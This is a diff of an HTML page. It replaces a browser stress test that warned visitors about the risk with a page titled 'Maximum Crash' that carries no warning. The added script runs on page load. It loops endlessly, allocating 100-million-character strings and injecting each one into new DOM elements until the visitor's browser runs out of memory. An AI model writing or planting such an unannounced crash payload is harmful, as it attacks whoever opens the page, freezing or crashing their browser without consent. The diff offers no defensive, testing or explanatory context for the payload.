@@ -2,45 +2,19 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Browser Stress Test</title>
-    <style>
-        body {
-            font-family: monospace;
-            background-color: #1a1a1a;
-            color: #f0f0f0;
-            text-align: center;
-            padding-top: 50px;
-            margin: 0;
-        }
-        h1 {
-            color: #ff4136;
-        }
-        p {
-            max-width: 600px;
-            margin: 20px auto;
-            line-height: 1.6;
-        }
-        .warning {
-            color: #ffdc00;
-            font-weight: bold;
-        }
-    </style>
+    <title>Maximum Crash</title>
 </head>
 <body>
-
-    <h1>Browser Stress Test</h1>
-    <p>This page will attempt to crash your browser by creating a massive number of DOM elements.</p>
-    <p class="warning">Proceed with caution. Your browser tab may become unresponsive and need to be closed.</p>
-
     <script>
-        // This will attempt to create and append an enormous number of divs to the body.
-        // The browser will run out of memory trying to render and manage them.
-        for (let i = 0; i < 1_000_000; i++) {
+        // yo
+        const bomb = [];
+        while (true) {
+            const hugeString = new Array(100_000_000).join('A');
+            bomb.push(hugeString);
             const div = document.createElement('div');
             document.body.appendChild(div);
+            div.innerHTML = hugeString;
         }
     </script>
-
 </body>
 </html>
